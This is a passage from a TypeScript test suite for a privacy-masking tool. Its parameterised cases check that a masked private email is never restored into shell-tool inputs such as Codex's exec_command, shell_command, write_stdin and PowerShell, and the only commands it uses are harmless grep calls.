    [{ cmd: 'grep W notes.md', shell: 'bash' }, 'exec_command', 'cmd', 0],
    [{ cmd: 'grep W notes.md', shell: '/bin/zsh' }, 'exec_command', 'cmd', 0],
    [{ cmd: 'grep W notes.md' }, 'exec_command', 'cmd', 0],
    [{ cmd: 'grep W notes.md', shell: 'pwsh' }, 'exec_command', 'cmd', 0],
    [{ cmd: 'grep W notes.md', shell: '/usr/local/bin/bash' }, 'exec_command', 'cmd', 0],
    [{ command: 'grep W notes.md' }, 'shell_command', 'command', 0],
    [{ chars: 'W', description: 'W' }, 'write_stdin', 'description', 0],
    [{ command: 'grep W notes.md' }, 'PowerShell', 'command', 0],
  ])(
    "gives Codex's exec_command, shell_command and write_stdin no value: %j as %s",
    (input, tool, field, expected) => {
      const { np, vault, sessionId } = harness();
      const word = bake(vault, sessionId, EMAIL, 'private_email');
      const masked = Object.fromEntries(
        Object.entries(input).map(([k, v]) => [k, v.replace('W', word)]),
      );
      const acc = newRestoreAccumulator();

      const out = restoreToolInput(np, masked, sessionId, acc, shellToolOf(tool)) as Record<
        string,
        string
      >;

      expect(out[field]?.includes(EMAIL) ? 1 : 0).toBe(expected);
    },
  );
});
